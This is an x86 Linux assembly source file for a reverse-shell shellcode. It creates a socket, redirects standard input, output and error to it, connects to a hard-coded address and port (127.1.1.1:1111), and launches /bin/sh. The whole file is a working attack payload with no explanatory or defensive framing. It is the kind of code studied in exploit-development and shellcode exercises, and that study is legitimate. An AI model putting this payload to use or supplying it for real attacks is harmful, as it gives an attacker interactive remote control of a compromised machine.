global _start           

section .text

_start:
    addr: equ 0x0101017F ; ip = 127.1.1.1
    port: equ 0x5704 ; port= 1111 
  
    ; socket(AF_INET, SOCK_STREAM, 0);
    cdq
    push 0x66           ; socketcall()
    pop eax                 
    push edx            
    inc edx
    push edx            
    mov ebx, edx        
    inc edx
    push edx            
    mov ecx, esp        
    int 0x80            ; call socketcall()

;dup2 int dup2(int oldfd, int newfd)
	xchg ebx, eax
	mov ecx, edx
	loop4dup:
	mov al, 0x3f
	int 0x80
	dec ecx
	jns loop4dup

    ; connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr))
    mov al, 0x66        ; socketcall()
    xchg ebx, edx       
    push addr    ; 127.1.1.1
    push word port    ; 1111
    push word bx        ; AF_INET   
    inc ebx             
    mov ecx, esp        
    push 0x10           
    push ecx            
    push edx            
    mov ecx, esp        
    int 0x80            ; call socketcall()

    ; execve("/bin/sh", NULL , NULL);
    push BYTE 11            ; execve()
    pop eax
    cdq
    mov ecx, edx
    push edx             
    push 0x68732f2f     ; //sh
    push 0x6e69622f     ; /bin
    mov ebx, esp       
    int 0x80            ; call execve()
